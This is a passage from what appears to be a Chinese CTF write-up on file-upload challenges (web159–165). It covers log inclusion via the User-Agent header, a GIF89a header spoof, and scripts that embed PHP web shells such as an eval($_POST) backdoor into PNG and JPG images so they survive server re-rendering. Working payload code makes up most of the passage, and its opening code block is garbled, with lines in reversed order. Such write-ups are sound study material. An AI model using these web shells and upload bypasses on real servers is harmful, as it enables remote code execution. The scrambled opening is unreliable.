class="string">&#x27;php&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"> link: https:<span class="comment">//ctfer.com</span></span><br><span class="line"> email: h1xa@ctfer.com</span><br><span class="line"> Last Modified time: <span class="number">2020</span>-<span class="number">10</span>-<span class="number">26</span> <span class="number">15</span>:<span class="number">49</span>:<span class="number">51</span></span><br><span class="line"> Last Modified by:   h1xa</span><br><span class="line"> Date:   <span class="number">2020</span>-<span class="number">10</span>-<span class="number">24</span> <span class="number">19</span>:<span class="number">34</span>:<span class="number">52</span></span><br><span class="line"> Author: h1xa</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;?php</span></span><br><span class="line"><span class="comment">&lt;?phpnothing here</span></span><br></pre></td></tr></table></figure><h1 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h1><h2 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号;"></a>过滤括号;</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409165109925.png" alt="image-20220409165109925"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=`tac ../fl*`?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409165019031.png" alt="image-20220409165019031"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409165041739.png" alt="image-20220409165041739"></p><h1 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h1><h2 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409165330693.png" alt="image-20220409165330693"></p><p>在ua上写入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=`tac ../fl*`?&gt;</span><br></pre></td></tr></table></figure><p>图片内容如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409165529131.png" alt="image-20220409165529131"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409174817796.png" alt="image-20220409174817796"></p><h1 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h1><h2 id="检查文件头前面加上"><a href="#检查文件头前面加上" class="headerlink" title="检查文件头前面加上"></a>检查文件头前面加上</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409181404771.png" alt="image-20220409181404771"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409181626857.png" alt="image-20220409181626857"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409181633251.png" alt="image-20220409181633251"></p><h1 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h1><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><h1 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h1><h1 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h1><h2 id="png图片二次渲染绕过"><a href="#png图片二次渲染绕过" class="headerlink" title="png图片二次渲染绕过"></a>png图片二次渲染绕过</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">    <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">    <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">    <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">    <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">    <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">    <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">    <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">    <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./zf.png&#x27;</span>);  <span class="comment">//要修改的图片的路径</span></span><br><span class="line"><span class="comment">/* 木马内容</span></span><br><span class="line"><span class="comment">&lt;?$_GET[0]($_POST[1]);?&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行完上传</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409182912857.png" alt="image-20220409182912857"></p><p>查看一下</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409182928106.png" alt="image-20220409182928106"></p><p>curl + s保存 打开查看</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409183005108.png" alt="image-20220409183005108"></p><h1 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h1><h2 id="jpg图片二次渲染绕过"><a href="#jpg图片二次渲染绕过" class="headerlink" title="jpg图片二次渲染绕过"></a>jpg图片二次渲染绕过</h2><p>PHP1.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miniPayload</span> = <span class="string">&#x27;&lt;?php @eval($_POST[&quot;zf&quot;]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">    <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">    <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">        <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">        <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">        <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">            <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">            <span class="variable">$outStreamTmp</span> =</span><br><span class="line">                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                <span class="variable">$miniPayload</span> .</span><br><span class="line">                <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) .</span><br><span class="line">                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">            <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                <span class="variable">$outStream</span> =</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) .</span><br><span class="line">                    <span class="variable">$miniPayload</span> .</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                        <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                        <span class="number">0</span>,</span><br><span class="line">                        <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) .</span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">    <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;binData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;binData));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable language_">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">            <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>zf.jpg</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409185129128.png" alt="image-20220409185129128"></p><p>直接上传</p><p>将图片保存到本地</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409185322599.png" alt="image-20220409185322599"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409185354692.png" alt="image-20220409185354692"></p><p>运行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409185416928.png" alt="image-20220409185416928"></p><p>产生</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409185438731.png" alt="image-20220409185438731"></p><p>上传</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409185502593.png" alt="image-20220409185502593"></p><p>连接</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409185520738.png" alt="image-20220409185520738"></p><p>upload.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-24 19:34:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-27 17:14:10</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext_suffix</span>, <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>)))&#123;</span><br><span class="line">                <span class="variable">$jpg</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$jpg</span>==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$dst</span> = <span class="string">&#x27;upload/&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                    <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$jpg</span>,<span class="variable">$dst</span>);</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">3</span>,<span 